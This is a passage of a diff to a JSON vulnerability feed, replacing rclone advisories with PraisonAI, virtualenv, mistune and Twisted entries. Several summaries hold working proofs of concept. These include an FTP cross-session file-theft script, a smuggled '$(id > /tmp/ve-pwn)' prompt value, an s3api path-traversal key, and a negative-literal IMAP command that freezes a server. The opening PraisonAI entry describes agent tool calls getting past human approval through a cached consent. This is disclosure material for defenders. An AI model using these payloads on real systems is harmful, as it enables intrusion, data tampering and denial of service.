1\nassert d2.reason == \"Already approved in context\"\n```\n\nNegative control: `execute_command` (critical) re-prompts on every call — 2 prompts for 2 calls.\n\n## Impact\n\nA `write_file` approval for a benign path authorizes every later `write_file` call in the session with arbitrary arguments. A model steered by malicious input can write to sensitive locations with no further human prompt.\n\n## Suggested fix\n\n- Include arguments in the approval cache key, or re-prompt on argument change.\n- Expire the cache per-call or per-turn.\n- Do not inherit the cache into child tasks.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-10-08",
+      "modified": "2026-10-08",
       "cwe": {
         "cwe_id": "CWE-863",
         "name": "Incorrect Authorization"
       },
       "references": [
-        "https://github.com/rclone/rclone/commit/739403963abf6f58003c2becd5f7c4ad0d644153",
-        "https://github.com/rclone/rclone/releases/tag/v1.75.1",
-        "https://github.com/rclone/rclone/security/advisories/GHSA-p569-5gjg-9cmj",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88044"
+        "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-29r9-67vg-qj56",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-60087",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-62164",
+        "https://www.vulncheck.com/advisories/praisonai-before-tool-approval-cache-bypass",
+        "https://github.com/advisories/GHSA-29r9-67vg-qj56"
       ],
       "vulnerableProducts": [
-        "rclone Bitnami"
+        "praisonaiagents pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88017",
-      "summary": "## Summary\n\nThe FTP auth-proxy driver stores one obscured password per username in a server-wide map. It does not bind the credential or returned VFS to the authenticated FTP session. If two accepted credentials use the same username but resolve to different proxy backends, the later login overwrites the map entry. Subsequent operations on the first, still-authenticated session are re-authorized with the later session's password and execute against the later session's backend.\n\nThis is not exploitable in every auth-proxy deployment. It requires a proxy that accepts distinct credentials for the same username and returns different roots or backend configurations, plus a later login while the attacker's session remains open. The behavior is nevertheless within the supported model: `cmd/serve/proxy` keys VFS entries by username, authentication material, and client IP specifically so a new credential can produce a fresh backend.\n\nConfirmed affected versions are `v1.75.0` and development commit `5629f2668c69149bf3d9d8e2a25bb32a2648606e`. The username-global map was introduced in `v1.64.0`, but versions before credential-aware proxy caching may require cache expiration or different timing and are not claimed as confirmed here.\n\n## Affected Assets & Attack Surface\n\n- `cmd/serve/ftp/ftp.go:170-178` defines `userPass map[string]string` as driver-global state keyed only by username.\n- `cmd/serve/ftp/ftp.go:318-335` validates `(user, pass)` through the proxy and then overwrites `d.userPass[user]`.\n- `cmd/serve/ftp/ftp.go:352-373` retrieves the current map entry by `Sess.LoginUser()` for every filesystem operation and calls the proxy again with that password.\n- `cmd/serve/ftp/ftp.go:376` onward routes FTP filesystem operations through `getVFS`, including stat, listing, retrieval, upload, rename, and deletion.\n- `cmd/serve/proxy/proxy.go:114-119` documents credential- and client-IP-aware backend caching.\n- `cmd/serve/proxy/proxy.go:235-243` derives a cache key from username, credential, and client IP.\n- `cmd/serve/proxy/proxy.go:328-365` resolves and verifies the VFS using that composite identity.\n- Attack surface: any `rclone serve ftp --auth-proxy ...` deployment in which the proxy accepts more than one credential for a shared username and those credentials do not have equivalent backend authority.\n\n## Technical Root Cause Analysis\n\nAuthentication initially uses the correct session data:\n\n```go\nd.proxy.Call(user, pass, false, sctx.Sess.RemoteAddr().String())\n```\n\nAfter success, the driver discards the returned VFS and VFS cache key. It obscures the password and stores it in:\n\n```go\nd.userPass[user] = oPass\n```\n\nFor each later FTP operation, `getVFS` knows only the session's username. It looks up whichever password was most recently stored for that username and calls the proxy again. The mutex prevents a Go data race but does not provide session isolation.\n\nThe authorization sequence is therefore:\n\n1. Session A authenticates as `shared` with credential A and receives backend A.\n2. Session B authenticates as `shared` with credential B and overwrites `userPass[\"shared\"]`.\n3. Session A performs another FTP command.\n4. `getVFS` uses credential B, not the credential that authenticated Session A.\n5. The proxy returns backend B, and Session A's command runs there.\n\nThis creates a cross-session identity mismatch; no race condition is required. Credential-dependent routing is not an artificial assumption added by the PoC: the proxy cache deliberately distinguishes the same username with different authentication material. A proxy that maps username alone, rejects all concurrent alternate credentials, or binds credentials to client IP in a way that rejects the replay is not exploitable by this sequence.\n\n## Proof of Concept & Evidence\n\nCreate two roots and a proxy that uses the password as a tenant token while requiring the same FTP username:\n\n```sh\nmkdir -p /tmp/rclone-ftp-attacker /tmp/rclone-ftp-victim\nprintf 'attacker-only\\n' > /tmp/rclone-ftp-attacker/attacker.txt\nprintf 'victim-secret\\n' > /tmp/rclone-ftp-victim/victim.txt\n\ncat > /tmp/rclone-ftp-proxy.py <<'PY'\n#!/usr/bin/env python3\nimport json\nimport sys\n\nrequest = json.load(sys.stdin)\nroots = {\n    \"attacker-token\": \"/tmp/rclone-ftp-attacker\",\n    \"victim-token\": \"/tmp/rclone-ftp-victim\",\n}\n\nif request.get(\"user\") != \"shared\" or request.get(\"pass\") not in roots:\n    sys.exit(1)\n\nprint(json.dumps({\n    \"type\": \"local\",\n    \"_root\": roots[request[\"pass\"]],\n}))\nPY\nchmod 700 /tmp/rclone-ftp-proxy.py\n```\n\nStart the FTP server on loopback:\n\n```sh\n./rclone serve ftp \\\n  --auth-proxy \"python3 /tmp/rclone-ftp-proxy.py\" \\\n  --addr 127.0.0.1:2121 \\\n  --passive-port 30000-30010\n```\n\nIn another terminal, keep both sessions open and trigger the overwrite:\n\n```sh\npython3 - <<'PY'\nimport ftplib\nimport io\n\ndef connect(password):\n    ftp = ftplib.FTP()\n    ftp.connect(\"127.0.0.1\", 2121, timeout=5)\n    ftp.login(\"shared\", password)\n    return ftp\n\nattacker = connect(\"attacker-token\")\n\n# Establish the attacker's original authority.\noriginal = bytearray()\nattacker.retrbinary(\"RETR attacker.txt\", original.extend)\nassert original == b\"attacker-only\\n\"\n\ntry:\n    attacker.size(\"victim.txt\")\n    raise AssertionError(\"victim file unexpectedly visible before overwrite\")\nexcept ftplib.error_perm:\n    pass\n\n# A second principal logs in with the same username and a different token.\nvictim = connect(\"victim-token\")\nassert victim.size(\"victim.txt\") > 0\n\n# The first session is now silently rebound to the victim backend.\nstolen = bytearray()\nattacker.retrbinary(\"RETR victim.txt\", stolen.extend)\nprint(stolen.decode().strip())\nattacker.storbinary(\"STOR victim.txt\", io.BytesIO(b\"modified-by-first-session\\n\"))\n\nattacker.quit()\nvictim.quit()\nPY\n\ngrep -F modified-by-first-session /tmp/rclone-ftp-victim/victim.txt\n```\n\nObserved against `5629f2668c69149bf3d9d8e2a25bb32a2648606e`:\n\n- Before the victim login, the attacker session resolves only the attacker root.\n- After the victim login, the already-authenticated attacker session reads `victim.txt`.\n- A write through the attacker session overwrites the file in the victim root.\n\nThe complete automated validation used the actual FTP listener, two simultaneous `github.com/jlaffaye/ftp` clients, and an external auth-proxy process that mapped the two tokens to separate temporary local roots. It verified the precondition that `victim.txt` was unavailable to the first session before the second login, then verified both cross-root read and overwrite after the login. It passed on Windows/amd64 with Go 1.26.2:\n\n```text\n=== RUN   TestSecurityValidationFTPAuthProxyCrossSession\nPASS: TestSecurityValidationFTPAuthProxyCrossSession (2.11s)\n```\n\nBoth PoC sessions use loopback, so they have the same client IP and the test isolates the credential-keying defect. Across different client IPs, the issue remains reachable when the proxy does not bind credentials to source addresses. If the proxy enforces such a binding, replay of the victim credential may fail and that deployment is not exploitable by this sequence.\n\n## Impact Assessment\n\nA low-privileged user with a valid auth-proxy credential can gain the read, write, and delete authority of another accepted credential sharing the same FTP username. The unauthorized capability is direct: the first session operates on the second credential's VFS without authenticating with that credential.\n\nThe maximum impact is cross-tenant disclosure, modification, and deletion of all objects exposed by the victim backend. Actual severity is lower when all credentials for a username intentionally represent the same principal and equivalent root. The victim or an automated client must log in after the attacker, and the attacker must keep the original FTP session open.\n\nThis is not a generic FTP username-enumeration issue and does not give an unauthenticated party access. It is a session-isolation failure in auth-proxy mode.\n\n## Remediation Guidance\n\nBind the credential or backend identity to the FTP session, never to the username. `goftp.io/server/v2` exposes `sctx.Sess.Data`, which persists across commands for one session and is released with that session.\n\nA compatible fix is:\n\n1. On successful `CheckPasswd`, store a private session binding in `sctx.Sess.Data`. The binding can contain the obscured password and username, or another opaque value sufficient to resolve the same proxy entry.\n2. In `getVFS`, retrieve only that session binding. Never consult a driver-global username map.\n3. If re-authentication occurs on the same FTP session, replace the binding only after the new authentication succeeds; clear it on a failed authentication attempt where the library keeps the session alive.\n4. Preserve proxy cache expiry semantics. Holding a VFS pointer forever would prevent the existing cache from expiring it; storing the session's obscured credential and re-calling `Proxy.Call` retains current expiry behavior while maintaining identity.\n5. Remove `userPass`, `userPassMu`, and the associated global credential lifetime after the session-based path is in place.\n\nAvoid keying a replacement map by remote address, username, or client IP. Multiple sessions can share all of those values. If a library limitation makes `Session.Data` unsuitable, use the `*ftp.Session` pointer as the key and add reliable disconnect cleanup; session-owned state is preferable because cleanup is automatic.",
-      "cvssScore": 7.3,
+      "id": "CVE-2026-115586",
+      "summary": "## Summary\n\nThe bash activator puts the caller-supplied prompt value into `PS1` unescaped whenever `promptvars` is off at activation time, and assumes prompt expansion can never run afterwards. `promptvars` and posix mode are runtime shell state, not a property of the activation moment: re-enabling prompt expansion in the same shell (`shopt -s promptvars`, `set -o posix`) or starting an interactive child bash that inherits the exported `PS1` makes bash expand the stored value and run the command substitution in it. An attacker who controls the prompt value gets command execution as the user who sources `bin/activate`.\n\nThis is a regression. 21.14.8 escaped `$` and the backtick unconditionally and stays inert under the same sequence. The 21.14.9 fix for GHSA-6w3r-xr62-4xcp (#3418) rewrote that block and left bash with a path that stores the raw value whenever `promptvars` is off.\n\n## Affected area\n\nActivation scripts (activate, activate.bat, activate.csh, activate.fish, activate.nu, Activate.ps1, activate.xsh) — specifically the bash `bin/activate`.\n\n## Attacker-controlled input\n\nThe `--prompt` value, which the security policy already lists as a value that may come from project metadata the user did not write. It reaches `virtualenv` as `--prompt` on the command line or as the `prompt` argument of the API, is written into `bin/activate` as the literal `VIRTUAL_ENV_PROMPT` assignment (correctly quoted, the value arrives there as data), and the script then copies it into `PS1` without escaping `$` or the backtick.\n\nExample: a repository or tool config supplies a prompt such as `x$(id > /tmp/ve-pwn)y`; the victim creates and later activates the environment.\n\n## Details\n\nSource of the latest release: [`src/virtualenv/activation/bash/activate.sh` lines 140-160](https://github.com/pypa/virtualenv/blob/21.14.12/src/virtualenv/activation/bash/activate.sh#L140-L160)\n\n```sh\nif [ -z \"${VIRTUAL_ENV_DISABLE_PROMPT-}\" ] &&\n    { [ -n \"${BASH_VERSION-}\" ] || [ -n \"${ZSH_VERSION-}\" ]; }; then\n    _OLD_VIRTUAL_PS1=\"${PS1-}\"\n    # bash expands PS1 after decoding its prompt escapes when promptvars is on or in posix mode, so the prompt holds a\n    # reference to the variable and its value never reaches that expansion; otherwise only the decode runs and\n    # backslashes need doubling. ...\n    if [ -n \"${BASH_VERSION-}\" ] && { shopt -q promptvars || shopt -qo posix; }; then\n        PS1='(${VIRTUAL_ENV_PROMPT-}) '\"${PS1-}\"\n    else\n        _VIRTUAL_PROMPT=\"${VIRTUAL_ENV_PROMPT//\\\\/\\\\\\\\}\"\n        if [ -n \"${ZSH_VERSION-}\" ]; then\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\$/\\\\\\$}\"\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\`/\\\\\\`}\"\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\%/%%}\"\n        fi\n        PS1=\"(${_VIRTUAL_PROMPT}) ${PS1-}\"\n        unset _VIRTUAL_PROMPT\n    fi\nfi\n```\n\nTwo separate mistakes combine:\n\n1. A runtime shell option is treated as a constant. `shopt -u promptvars` at the moment of `source` does not bind the shell forever: `shopt -s promptvars` and `set -o posix` both re-enable PS1 expansion in the same shell. The code itself tests `shopt -qo posix` because posix mode expands the prompt regardless of `promptvars`, which shows the expansion state is not fixed by the activation.\n2. The escaping that would keep the value inert in that mode is missing for bash. GHSA-5vjq-rrrf-7h2q (\"activate runs commands from the environment name in zsh with PROMPT_SUBST\") fixed exactly this shape for zsh, reasoning that \"a user can set it after activation\", by escaping `$` and the backtick. Bash lost the equivalent escaping in the same commit that added the zsh branch.\n\nThe rendered prompt shows the regression directly:\n\n```\n21.14.8   PS1 = (x\\\\$(id > /tmp/ve-pwn)y)       <- escaped, inert\n21.14.9   PS1 = (x$(id > /tmp/ve-pwn)y)         <- raw value\n21.14.12  PS1 = (x$(id > /tmp/ve-pwn)y)         <- raw value\n```\n\nRelevant commit: [`5f48d711` \"fix(bash): preserve literal prompts in supported shells (#3418)\"](https://github.com/pypa/virtualenv/commit/5f48d711731311428aebfae61d46957762155b22), which removed the unconditional `$`/backtick escaping from the bash path. Advisory for that change: [GHSA-6w3r-xr62-4xcp](https://github.com/pypa/virtualenv/security/advisories/GHSA-6w3r-xr62-4xcp).\n\n## Proof of concept\n\nNon-destructive payload: it runs `id` and writes the output to a file.\n\n```bash\npython -m virtualenv --no-seed --no-periodic-update --activators bash \\\n    --prompt 'x$(id > /tmp/ve-pwn)y' /tmp/venv-demo\n\ncat > /tmp/rc <<'EOF'\nshopt -u promptvars\n. /tmp/venv-demo/bin/activate\nshopt -s promptvars\nEOF\n\n# the prompt needs a tty; script(1) provides one\nprintf 'exit\\n' | script -qec 'bash --noprofile --rcfile /tmp/rc -i' /dev/null\n\ncat /tmp/ve-pwn\n```\n\nObserved on 21.14.12:\n\n```\n$ cat /tmp/ve-pwn\nuid=1000(asrun) gid=1000(asrun) groups=1000(asrun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),999(ollama)\n```\n\nThe prompt printed as `(xy)`. The same script against 21.14.8 creates no file; against 21.14.9 and 21.14.12 it does.\n\nTriggers, all run in a pty, activation itself never executing anything; execution happens at the next prompt redraw after prompt expansion is enabled:\n\n| After `. bin/activate` (activated with `shopt -u promptvars`) | 21.14.8 | 21.14.9 | 21.14.12 |\n| --- | --- | --- | --- |\n| `shopt -s promptvars` | inert | executes | executes |\n| `set -o posix` | inert | executes | executes |\n| `export PS1`, then start an interactive child `bash` (its `promptvars` defaults to on) | inert | executes | executes |\n| control: activation with default options | inert | inert | inert |\n| control: activation with `set -o posix` already on | inert | inert | inert |\n\nThe third trigger needs no explicit option change: the poisoned `PS1` is inherited and the child bash expands it on its first prompt.\n\n`shopt -u promptvars` is a documented way to make an expensive bash prompt cheap and appears in `~/.bashrc` files for that reason; it is also the state left by some prompt wrappers. Whoever sources such an environment gets the unescaped value in `PS1`.\n\n## Impact\n\nCommand execution as the user who sources `bin/activate`, from a value the user may not have written (project metadata or tool config reaching `--prompt`). The value is also persisted in `pyvenv.cfg` and in the generated script, so it survives the activation that created it and fires later, in a different shell session, on the first prompt redraw with expansion enabled. No privilege elevation beyond the activating user.\n\nSeverity: high, matching GHSA-5vjq-rrrf-7h2q for the same class of prompt-expansion command injection reached by toggling a shell option after activation. If you consider the `promptvars` state a caller-controlled condition rather than a shell condition, this is medium; the fix is the same either way.\n\n## Versions tested\n\nvirtualenv 21.14.12 and 21.14.9 (affected), virtualenv 21.14.8 (unaffected control); CPython 3.14.7; Linux 6.x (WSL2); bash 5.1.16(1)-release. `--prompt` handling is platform independent; zsh/fish/csh/nu/PowerShell activators were not part of this report.\n\n## Known mitigation\n\nFor a user: activate with `promptvars` left at its default, or set `VIRTUAL_ENV_DISABLE_PROMPT=1` before activating, which skips the whole prompt block. Do not pass an untrusted value to `--prompt`.\n\nFix in the activator: escape `$` and the backtick for bash as well, in both branches, with a single backslash (`$` -> `\\$`, backtick -> ``\\` ``, `\\` -> `\\\\`). Verified on bash 5.1.16 that a `PS1` built that way is inert with `promptvars` on, with `promptvars` off, and with `promptvars` off followed by posix mode, while still rendering the literal value on screen. That is better than both current shapes: 21.14.8's four-level escaping left stray backslashes on screen, which is why the block was rewritten.\n\n```sh\n    else\n        _VIRTUAL_PROMPT=\"${VIRTUAL_ENV_PROMPT//\\\\/\\\\\\\\}\"\n        _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\$/\\\\\\$}\"\n        _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\`/\\\\\\`}\"\n        if [ -n \"${ZSH_VERSION-}\" ]; then\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\%/%%}\"\n        fi\n        PS1=\"(${_VIRTUAL_PROMPT}) ${PS1-}\"\n```\n\nFor the tests, `tests/unit/activation/test_bash.py::test_bash_prompt_options` already parametrises `(\"before\", \"after\", \"expected\")` and covers `before=\"shopt -u promptvars\"` with `after=\"\"`. The missing axis is the transition: `(\"shopt -u promptvars\", \"shopt -s promptvars\", ...)` and `(\"shopt -u promptvars\", \"set -o posix\", ...)`, with the existing `PWNED` check asserting no file was created.\n\n## Latest release\n\n- [x] The problem reproduces on the latest virtualenv release.",
+      "cvssScore": 7.1,
       "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
       "cwe": {
-        "cwe_id": "CWE-488",
-        "name": "Exposure of Data Element to Wrong Session"
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
       },
       "references": [
-        "https://github.com/rclone/rclone/security/advisories/GHSA-c476-6w5q-jw77",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88017",
-        "https://github.com/rclone/rclone/commit/c6af0b57c2b4af848bc968c2b407354476184b99",
-        "https://github.com/rclone/rclone/releases/tag/v1.75.1",
-        "https://github.com/advisories/GHSA-c476-6w5q-jw77"
+        "https://github.com/pypa/virtualenv/security/advisories/GHSA-cx6f-vjhg-g3cc",
+        "https://github.com/pypa/virtualenv/pull/3466",
+        "https://github.com/pypa/virtualenv/commit/3598e201f6f044e389136b2347a8a919ac03c5f4",
+        "https://github.com/pypa/virtualenv/releases/tag/21.14.13",
+        "https://github.com/advisories/GHSA-cx6f-vjhg-g3cc"
       ],
       "vulnerableProducts": [
-        "github.com/rclone/rclone go"
+        "virtualenv pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88046",
-      "summary": "### Summary\n\nMultiple backends, when given a specially crafted object to copy, can escape the backend confinement.\n\n| Backend | Keep/Close | Per-backend severity |\n|---|---|---|\n| sftp | Medium | Real filesystem escape, fires under default encoding. |\n| smb | Low-Medium | Escapes to a different SMB share the credential can reach. |\n| ftp | Low | Real, leading-`..` overshoot PoC is partly neutralized by encoding; escape bounded to at/below the login base. |\n| webdav | Low | Server-side ACLs are the real boundary. |\n| b2 | Low | Same-account sibling **bucket** crossing on a flat keyspace. |\n| swift | Low | Same, container. |\n| qingstor | Low | Same. |\n| oracleobjectstorage | Low | Same. |\n| internetarchive | Low | IA items are owner-writable only; confined to user's own items. |\n| storj | Low | Can retarget a different bucket in the same access grant. |\n| filelu | Low | Confined to the user's own account. |\n| shade | Low | Confined to the user's own drive. |\n| sia | Low | siad API password already grants full-daemon access. |\n\n## Root cause\n\nrclone core does **not** sanitize `..` in a source object's `Remote()` - verified: nothing in `fs/march`, `fs/sync`, `fs/list`, or `fs/operations` rejects `..` segments before the name reaches the destination backend's `Put`/`Update`/`Mkdir`. Confinement is therefore each backend's responsibility, and these backends join `root + remote` without a check.\n\nThis divides into two classes:\n\n- **Bucket based backends** - `bucket.Split(path.Join(f.root, rootRelativePath))`:\n  - `backend/b2/b2.go:404`, `backend/swift/swift.go:464`, `backend/qingstor/qingstor.go:198`, `backend/oracleobjectstorage/oracleobjectstorage.go:245`, `backend/internetarchive/internetarchive.go:1016`, `backend/smb/smb.go:885`, `backend/storj/fs.go:289`.\n  - `path.Join` collapses `..` on the standard (ASCII) form **before** encoding is applied (e.g. `FromStandardPath(path.Join(...))` at `backend/b2/b2.go:1641`), so `EncodeDot` never gets the chance to neutralize the `..`.\n  - `lib/bucket.Join` does **not** clean paths (keeps `..` as a literal key segment); `path.Join` does. `backend/s3`, `backend/azureblob`, `backend/googlecloudstorage` already use `bucket.Join` and are therefore not affected.\n\n- **Path based backends** - `path.Join(root, remote)` onto a real path:\n  - sftp: `remotePath = path.Join(f.absRoot, f.opt.Enc.FromStandardPath(remote))` (`backend/sftp/sftp.go:2497`). Default encoding is `encoder.Display` (== `Standard`), and `FromStandardPath` short-circuits to a pass-through in that mode, so `..` survives; `f.absRoot` is absolute, so `path.Join(\"/home/user/root\", \"../../../../etc/passwd\")` -> `/etc/passwd`.\n  - webdav: `filePath` at `backend/webdav/webdav.go:426-432`.\n  - ftp: `path.Join(f.root, remote)` at ~14 sites (e.g. `backend/ftp/ftp.go:1247`).\n  - filelu, shade, sia: analogous joins.\n\n### Precondition that limits reachability\n\nFor any of these to fire, a **source** must hand rclone a `Remote()` containing raw `..`. That is only possible when:\n\n1. the source is a **flat-keyspace object store** (not a filesystem - a local/sftp/smb source cannot represent `../../x` as one directory entry), **and**\n2. the offending key was written with **native, non-rclone tooling** - rclone's own writer applies `EncodeDot` and rewrites a `..` segment to fullwidth `．．`, so you cannot create such a key *through rclone*.\n\nrclone's source-side listing does pass a natively-planted raw `..` key through unchanged (verified for b2: `remote := file.Name[len(prefix):]` after `ToStandardPath`, `backend/b2/b2.go:858,867`). The reports never establish this precondition; it is the same omission across every member of the class.\n\n### Example attack\n\n```bash\n# Step 1 - attacker, using NATIVE S3 tooling (NOT rclone) on a source the victim ingests from:\naws s3api put-object --bucket shared-drop --key '../../victim-backups/pwned.txt' --body evil.txt\n\n# Step 2 - victim's ordinary ingest:\nrclone copy s3-drop:shared-drop b2:victim-uploads/incoming\n# path.Join(\"victim-uploads/incoming\", \"../../victim-backups/pwned.txt\") = \"victim-backups/pwned.txt\"\n# -> lands in the victim's victim-backups bucket instead of under incoming/\n```\n\nThe blast radius is the victim's **own** account (a bucket/share/path the configured credential already reaches) - integrity misdirection, not a cross-tenant or confidentiality breach. sftp/smb are the exception in *reach* (server filesystem / other share), still bounded by the login's own permissions.\n\n## Precedent\n\nThis is the same class as the already-fixed local backend advisory [https://github.com/rclone/rclone/security/advisories/GHSA-7p4m-qxvv-g567](GHSA-7p4m-qxvv-g567), which added `(*Fs).localPath` returning `errPathEscapes` for names resolving outside the root (`backend/local/local.go:819-826`). That fix was justified because the destination was the operator's own OS filesystem; the same reasoning extends (at lower severity) to sftp/smb.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-09-19",
-      "modified": "2026-09-19",
+      "id": "CVE-2026-115355",
+      "summary": "The Include directive in `src/mistune/directives/include.py` does not validate that the resolved file path stays within the source directory, allowing path traversal via `../` sequences to read arbitrary files.\n\nAdditionally, error messages and included file contents are rendered without HTML escaping, leading to XSS even when `escape=True`.\n\nAffected functions:\n- Path resolution (lines 27-31)\n- `block_error()` in html.py (line 140)\n- `render_html_include()` (line 72)\n\nThe Include plugin must be explicitly enabled via the plugins parameter.",
+      "cvssScore": null,
+      "severity": "High",
+      "published": "2026-10-23",
+      "modified": "2026-10-23",
       "cwe": {
         "cwe_id": "CWE-22",
         "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
       },
       "references": [
-        "https://github.com/rclone/rclone/commit/57842c5ee4e1407eda06a414a36510cce2db4252",
-        "https://github.com/rclone/rclone/releases/tag/v1.75.1",
-        "https://github.com/rclone/rclone/security/advisories/GHSA-38xv-hf3p-h7mq",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88046"
+        "https://github.com/lepture/mistune/security/advisories/GHSA-h7ww-273w-6cm8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-115355",
+        "https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993",
+        "https://github.com/lepture/mistune/releases/tag/v3.3.0",
+        "https://www.vulncheck.com/advisories/mistune-before-3.3.0-path-traversal-and-xss-via-include-directive"
       ],
       "vulnerableProducts": [
-        "rclone Bitnami"
+        "mistune pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0328",
-      "summary": "Cross-site scripting vulnerability in Ikonboard 3.0.1 allows remote attackers to execute arbitrary script as other Ikonboard users and steal cookies via Javascript in an IMG tag.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=101475420818274&w=2",
-        "http://www.securityfocus.com/bid/4182",
-        "http://marc.info/?l=bugtraq&m=101475420818274&w=2",
-        "http://www.securityfocus.com/bid/4182"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0329",
-      "summary": "Cross-site scripting vulnerability in Snitz Forums 2000 3.3.03 and earlier allows remote attackers to execute arbitrary script as other Forums 2000 users via Javascript in an IMG tag.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://forum.snitz.com/forum/link.asp?TOPIC_ID=23660",
-        "http://marc.info/?l=bugtraq&m=101485184605149&w=2",
-        "http://online.securityfocus.com/archive/1/258981",
-        "http://www.iss.net/security_center/static/8309.php",
-        "http://www.kb.cert.org/vuls/id/132011"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0330",
-      "summary": "Cross-site scripting vulnerability in codeparse.php of Open Bulletin Board (OpenBB) 1.0.0 allows remote attackers to execute arbitrary script and steal cookies via Javascript in the IMG tag.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://community.iansoft.net/read.php?TID=5159",
-        "http://marc.info/?l=bugtraq&m=101466092601554&w=2",
-        "http://www.iss.net/security_center/static/8278.php",
-        "http://www.osvdb.org/5658",
-        "http://www.securityfocus.com/bid/4171"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0167",
-      "summary": "IIS Inetinfo.exe allows local users to cause a denial of service by creating a mail file with a long name and a .txt.eml extension in the pickup directory.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2000-02-15",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0002&L=ntbugtraq&F=&S=&P=8800",
-        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0002&L=ntbugtraq&F=&S=&P=8800"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-101143",
-      "summary": "A vulnerability was found in Eleveo Quality Management 9.7.0. Affected by this issue is some unknown functionality of the file /qm/cz.zoom.scorecard.webui.Scorecard/cz.zoom.scorecard.webui.Scorecard/QMBODownload. The manipulation results in information disclosure. The attack may be launched remotely. The exploit has been made public and could be used. The vendor was contacted early about this disclosure but did not respond in any way.",
-      "cvssScore": 4.2,
+      "id": "CVE-2026-115774",
+      "summary": "## Summary\n\nAn infinite-loop vulnerability (CWE-835) in the Twisted IMAP4 server lets an authenticated client freeze the whole process with one small command. `twisted.mail.imap4.parseNestedParens` reads an IMAP literal size with `int()` and never rejects a negative value. A negative size such as `{-100}` drives the parser cursor negative, and because a negative Python index wraps around the end of the string instead of raising, the scanning loop never terminates. It runs synchronously on the single-threaded reactor, so one `SEARCH` command holds the reactor at full CPU forever and every other connection stops being served.\n\n## Details\n\nMeeting an inline literal, `parseNestedParens` reads the size between the braces and advances the cursor past the body:\n\n```python\n# twisted/mail/imap4.py  parseNestedParens\nliteralSize = int(s[i + 1 : end])          # no sign check\ncontentStack[-1].append((s[end + 3 : end + 3 + literalSize],))\ni = end + 3 + literalSize                    # negative size -> i goes negative\n```\n\n`int(b\"-100\")` is `-100`, so `i` goes negative; the loop condition `i < len(s)` stays true and `s[i : i + 1]` on a negative index never raises, so the cursor cycles forever. The `_literalStringLimit` guard only covers the synchronizing-literal continuation path, not this inline branch. The call is reached from `select_SEARCH` through `arg_searchkeys`, dispatched only in the selected state, so a valid login and a selected mailbox (any low-privilege account) suffice. It runs in the reactor thread, and the connection timeout cannot fire because the reactor itself is frozen.\n\nAffected product: Twisted (`twisted.mail`), the IMAP4 server `twisted.mail.imap4.IMAP4Server`\nAffected versions: 26.4.0 and earlier\n\n## PoC\n\nLog in, select a mailbox, and send a `SEARCH` whose literal size is negative:\n\n```text\nC: t1 LOGIN testuser password-test\nC: t2 SELECT INBOX\nC: t3 SEARCH {-100}zzzzzzzzzz\n```\n\nThe server never responds and one core stays at 100 percent. In a measured run a health service co-hosted on the same reactor stopped answering the instant the command arrived, showing the freeze hits the whole process and not just the attacking connection. A valid `{5}zzzzz` completes normally and a non-numeric `{abc}` is rejected with a parse error, which isolates the cause to the missing negative-size check.\n\n## Impact\n\nA remote denial of service. One command of about ten bytes freezes the single-threaded reactor, so it stops serving not only every other IMAP connection but every other service co-hosted in the same process (for example SMTP and POP3 under `twistd mail`), and no timeout can recover it until the process is restarted. It requires an authenticated session, so any account holder can trigger it; there is no confidentiality or integrity impact and no code execution.",
+      "cvssScore": 4.9,
       "severity": "Medium",
-      "published": "2026-09-28",
-      "modified": "2026-09-28",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-101143",
-        "https://drive.google.com/file/d/1qKulZLn6xxT3ePlV__Q-0MKLhlWmRI_U/view?usp=sharing",
-        "https://vuldb.com/cve/CVE-2026-101143",
-        "https://vuldb.com/submit/894908",
-        "https://vuldb.com/vuln/410995"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0159",
-      "summary": "HP Ignite-UX does not save /etc/passwd when it creates an image of a trusted system, which can set the password field to a blank and allow an attacker to gain privileges.",
-      "cvssScore": 7.5,
